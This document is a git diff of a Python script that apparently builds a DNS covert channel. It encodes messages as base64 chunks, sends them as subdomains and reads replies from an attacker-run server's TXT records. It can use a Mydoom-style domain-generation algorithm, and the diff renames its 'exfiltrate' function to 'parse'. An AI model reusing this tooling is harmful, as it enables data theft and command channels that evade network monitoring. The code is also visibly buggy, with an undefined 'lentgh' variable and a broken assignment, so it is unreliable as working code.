@@ -6,38 +6,38 @@ from sys import argv
 import time
 
 import dns.resolver
-from dga import mydoom
+# from dga import mydoom
 
-# DOC:
 # <Fucntion of ability>
-##  - confirm the number of required request packets -> special subdomain 'mail'
-##  - select both generated domain(DGA) and specific domain
-##  - select the type of decode from [base32, base64, base85]
-##  - specify the time of interval
-##  - embed the message as subdomain
+## - confirm the number of required request packets -> use subdomain by 'mail'
+## - select both generated domain(DGA) and specific domain
+## - select the type of decode from [base32, base64, base85]
+## - specify the time of interval
+## - embed the message as subdomain
 # <Scenario>
 ## 1. decide the target hostname
 ##   > choose dga or specific domain
 ## 2. confirm the number of required request packets
 ##   * your auth server calculates the number of it based on the size of message
 ## 3. request the TXT record -> with www
-# <Mapping of subdomain>
+# <Mapping of subdomain's order for the server>
 ## - 'mail' : calculate the number of required packets
 ##   * your auth server embeds the size and the number of packet in TXT RR
 ## - 'www'  : request the message in TXT RR
 
-def dga():
-    pass
+# def dga():
+#     pass
 
-def exfiltrate(msg:str, length:int=10) ->list:
+def parse(msg:str, length:int=10) ->list:
     """
+    * split the message after encoding it to base64
+    * make the list of splited messages
     - control the number of packets based of the response packet size
-    - if the requested message packet, 
-    """
     # if you decode the message, put on '=' in the end after comine the line
-    encrypted = base64.b64encode(msg.encode()).decode().strip('=')
-    decomposed_msg = [_encrypted[i: i+lentgh] for i in range(0, len(_encrypted), length)]
-    return decompose_msg
+    """
+    encoded = base64.b64encode(msg.encode()).decode().strip('=')
+    response = [encoded[i: i+lentgh] for i in range(0, len(encoded), length)]
+    return response
 
 def query(message:list, hostname:str, interval:int) ->list:
     """
@@ -78,8 +78,7 @@ def query(message:list, hostname:str, interval:int) ->list:
         return 0
 
 
-def decipher(answer: list) -> str:
-
+def decipher(answer: list) ->str:
     """
     - Gather the TXT query's domain authentication value
     - Extract the value of domain verification
@@ -126,4 +125,6 @@ if __name__ == '__main__':
     if args.interval:
         interval = args.interval
     if args.message:
-         = args.message
+        message = args.message
+
+    response = parse(message)
